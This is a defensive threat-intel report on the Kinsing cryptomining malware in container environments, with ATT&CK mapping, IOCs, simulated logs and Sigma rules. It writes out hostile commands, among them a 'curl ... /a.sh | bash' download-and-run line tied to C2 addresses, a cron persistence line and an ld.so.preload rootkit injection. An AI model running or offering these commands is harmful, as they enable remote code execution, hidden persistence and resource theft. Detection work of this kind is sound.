# Kinsing (H2Miner) Threat Intel Report

THREAT LEVEL: HIGH

Subject: Kinsing Malware (Container & Kubernetes Targeting)

Author: Nihal

Date: December 26, 2026

## High-Level Summary

Kinsing is a golang-based malware family actively targeting Linux-based container environments (Docker, Kubernetes). Its primary goal is to deploy the XMRig cryptominer. Kinsing is notorious for exploiting misconfigured container APIs (like an exposed Docker Socket) or vulnerabilities in weak images (e.g., Log4Shell, Atlassian Confluence exploits) to gain initial access. Once inside, it aggressively removes competing miners and spreads laterally across the cluster.

## Quick Look

| Attribute          | Details                                                               |
| :----------------- | :-------------------------------------------------------------------- |
| Threat Family      | Kinsing (aka H2Miner)                                                 |
| Attribution        | Unknown (Likely Financially Motivated)                                |
| Target Assets      | Docker Containers, Kubernetes Clusters, Redis Servers, Jenkins        |
| Primary Objective  | Cryptojacking (Monero Mining)                                         |
| Propagation Vector | Exploiting Misconfigured Docker APIs, Redis, and Web Vulnerabilities  |
| Targeted Platforms | Linux (Containers)                                                    |

## Threat at a Glance: Key ATT&CK TTPs (Cloud Focus)

*   **T1190 (Exploit Public-Facing Application):** Exploits vulnerabilities in containerized applications (Redis, Jenkins, WebLogic).
*   **T1609 (Container Administration Command):** Abuses the Docker API or Kubernetes API to create new privileged containers.
*   **T1562.001 (Impair Defenses: Disable or Modify Tools):** Kills competing cryptominers and security tools (like Alibaba Cloud Shield `aliyun-service`).
*   **T1222.002 (File and Directory Permissions Modification: Linux and Mac File Permissions):** Modifies `/etc/ld.so.preload` to hook system calls and hide its processes.
*   **T1496 (Resource Hijacking):** Deploys the `kdevtmpfsi` miner.

## Kinsing Deep Dive: Technical Analysis

### Initial Access & Execution
Kinsing often enters via an exposed Redis port (6379) or Docker API (2375). It runs a shell script that downloads the main payload (`kinsing`) and the miner (`kdevtmpfsi`).

### Defense Evasion (Process Hiding)
A unique trait of Kinsing is its use of `ld.so.preload`. It injects a malicious shared object library to intercept system calls like `readdir`, effectively hiding the `kdevtmpfsi` process from standard tools like `top` or `ps`.

### Persistence & Lateral Movement
It achieves persistence by adding cron jobs (`/var/spool/cron/root`) that re-download the setup script if deleted. It also scans the network for other open SSH or Redis ports using masscan/zmap to spread to other nodes in the cluster (Worm-like behavior).

## Comparative Analysis & Attack Journey

### Attack Journey Overview

1.  **Infiltration**
    Attacker scans for exposed Docker APIs or Redis servers without authentication.

2.  **Staging**
    A shell script is executed: `curl -sL http://<C2_IP>/a.sh | bash`. This script disables SELinux and kills competitors.

3.  **Persistence**
    The script writes a cron job: `* * * * * curl -sL http://<C2_IP>/a.sh | bash`.

4.  **Defense Evasion**
    Downloads a rootkit `libsystem.so` and adds it to `/etc/ld.so.preload` to hide processes.

5.  **Action on Objectives**
    The main binary `kinsing` manages the botnet connection, while `kdevtmpfsi` mines Monero.

## Actionable Detections and Threat Hunting

### Hunting for "kdevtmpfsi"
The presence of the binary `kdevtmpfsi` or `kinsing` in `/tmp` or `/var/tmp` is a 100% confidence indicator.

### Sigma Rule (Container/Linux)
Detects the specific `wget` or `curl` patterns used by Kinsing's setup script.

```yaml
title: Kinsing Malware Download Pattern
id: 88776655-4433-2211-0099-887766554433
status: high
description: Detects command line patterns associated with the download and execution of the Kinsing infection script.
author: Nihal
date: 2026-01-02
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    commandline|contains|all:
      - 'curl'
      - '| bash'
    commandline|contains:
      - '/a.sh'
      - '/kinsing'
      - 'unk.sh'
  condition: selection
level: high
tags:
  - attack.execution
  - attack.t1059.004
```

## Indicators of Compromise (IOCs)

| Type          | Indicator                                         | Context                     |
| :------------ | :------------------------------------------------ | :-------------------------- |
| **File Name** | `kdevtmpfsi`                                      | The Miner Payload           |
| **File Name** | `kinsing`                                         | The Botnet Agent            |
| **Path**      | `/etc/ld.so.preload`                              | Modified for Process Hiding |
| **IP Address**| `195.3.146.118`                                   | Common C2                   |
| **IP Address**| `45.10.88.102`                                    | Common C2                   |

## Platform Things

### Event Logs (Linux/Container Simulation)

```text
eventdate,hostname,user,processid,image,processcommandline,targetfilename,targetobject,details,destinationip,destinationport,protocol,hashes
2026-01-02 09:15:00,k8s-worker-03,root,4501,/usr/bin/curl,"curl -sL http://195.3.146.118/a.sh | bash",-,-,-,195.3.146.118,80,TCP,-
2026-01-02 09:15:05,k8s-worker-03,root,4520,/bin/chmod,"chmod +x /tmp/kdevtmpfsi",/tmp/kdevtmpfsi,-,-,-,-,-,-
2026-01-02 09:15:10,k8s-worker-03,root,4535,/bin/echo,"echo /usr/local/lib/libsystem.so > /etc/ld.so.preload",/etc/ld.so.preload,-,-,-,-,-,-
2026-01-02 09:16:00,k8s-worker-03,root,4600,/tmp/kdevtmpfsi,"/tmp/kdevtmpfsi",-,-,-,45.10.88.102,443,TCP,e4d3c2b1a098765432101234567890abcdef
```

### Sigma Rules(3)

**Log Event:**
```text
2026-01-02 09:15:00,k8s-worker-03,root,4501,/usr/bin/curl,"curl -sL http://195.3.146.118/a.sh | bash",-,-,-,195.3.146.118,80,TCP,-
```

```yaml
title: Kinsing Infection Script Execution
id: 11223344-5566-7788-9900-aabbccddeeff
status: critical
description: Detects the piped execution of the Kinsing setup script from known common filenames.
author: Nihal
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    commandline|contains|all:
      - 'curl'
      - '| bash'
    commandline|contains:
      - '/a.sh'
      - '/spr.sh'
  condition: selection
level: critical
```

**Log Event:**
```text
2026-01-02 09:15:10,k8s-worker-03,root,4535,/bin/echo,"echo /usr/local/lib/libsystem.so > /etc/ld.so.preload",/etc/ld.so.preload,-,-,-,-,-,-
```

```yaml
title: Modification of ld.so.preload (Rootkit Behavior)
id: aabbccdd-1122-3344-5566-778899001122
status: critical
description: Detects writing to /etc/ld.so.preload, a technique used by Kinsing to hide processes via library injection.
author: Nihal
logsource:
  category: file_event
  product: linux
detection:
  selection:
    TargetFilename: '/etc/ld.so.preload'
  condition: selection
level: critical
```

**Log Event:**
```text
2026-01-02 09:16:00,k8s-worker-03,root,4600,/tmp/kdevtmpfsi,"/tmp/kdevtmpfsi",-,-,-,45.10.88.102,443,TCP,e4d3c2b1a098765432101234567890abcdef
```

```yaml
title: Kdevtmpfsi Miner Execution
id: 55443322-1100-aabb-ccdd-eeff00112233
status: high
description: Detects the execution of the kdevtmpfsi binary, the primary payload of the Kinsing malware.
author: Nihal
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    image|endswith: 'kdevtmpfsi'
  condition: selection
level: high
```
